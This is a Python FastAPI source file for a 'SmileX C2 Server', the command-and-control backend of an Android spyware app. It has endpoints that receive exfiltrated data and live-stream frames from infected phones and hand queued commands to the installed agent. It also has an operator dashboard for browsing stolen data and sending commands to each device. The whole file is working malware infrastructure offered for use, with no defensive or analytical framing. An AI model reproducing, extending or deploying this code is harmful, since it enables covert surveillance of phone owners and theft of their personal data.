from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from database import (
    init_db, register_device, store_exfil, queue_command,
    get_pending_commands, get_devices, get_exfil_data,
    get_all_commands, get_stats
)
import json
import os
import base64
from datetime import datetime

app = FastAPI(title="SmileX C2 Server")
templates = Jinja2Templates(directory="templates")

@app.on_event("startup")
async def startup():
    init_db()

# --- Agent API (APK communicates with this) ---

@app.post("/api/exfil")
async def receive_exfil(request: Request):
    try:
        data = await request.json()
        device_id = data.get("device_id", "unknown")
        data_type = data.get("type", "unknown")
        payload = data.get("data", "")
        filename = data.get("filename")
        model = data.get("model")
        android_version = data.get("android_version")
        enc = data.get("enc", "0")

        register_device(device_id, model, android_version)
        store_exfil(device_id, data_type, payload, filename)

        return {"status": "ok"}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/c2")
async def c2_poll(request: Request):
    try:
        data = await request.json()
        device_id = data.get("device_id", "unknown")
        model = data.get("model")
        android_version = data.get("android_version")

        register_device(device_id, model, android_version)

        pending = get_pending_commands(device_id)
        return {"commands": pending}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/livestream")
async def receive_livestream(request: Request):
    try:
        data = await request.json()
        device_id = data.get("device_id", "unknown")
        frame = data.get("frame", "")
        conn = __import__("database").get_db()
        c = conn.cursor()
        c.execute("INSERT INTO livestream (device_id, frame_data) VALUES (?, ?)",
                  (device_id, frame))
        conn.commit()
        conn.close()
        return {"status": "ok"}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

# --- Dashboard API ---

@app.get("/api/stats")
async def stats():
    return get_stats()

@app.get("/api/devices")
async def devices():
    return get_devices()

@app.get("/api/exfil")
async def exfil(device_id: str = None, data_type: str = None, limit: int = 100):
    return get_exfil_data(device_id, data_type, limit)

@app.get("/api/commands")
async def commands(device_id: str = None, limit: int = 100):
    return get_all_commands(device_id, limit)

@app.post("/api/send_command")
async def send_command(request: Request):
    data = await request.json()
    device_id = data.get("device_id")
    cmd = data.get("cmd")
    args = data.get("args")
    if not device_id or not cmd:
        raise HTTPException(status_code=400, detail="device_id and cmd required")
    queue_command(device_id, cmd, args)
    return {"status": "queued"}

# --- Web Dashboard ---

@app.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    return templates.TemplateResponse("dashboard.html", {
        "request": request,
        "stats": get_stats(),
        "devices": get_devices()
    })

@app.get("/device/{device_id}", response_class=HTMLResponse)
async def device_detail(request: Request, device_id: str):
    return templates.TemplateResponse("device.html", {
        "request": request,
        "device_id": device_id,
        "exfil": get_exfil_data(device_id, limit=50),
        "commands": get_all_commands(device_id, limit=50)
    })

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
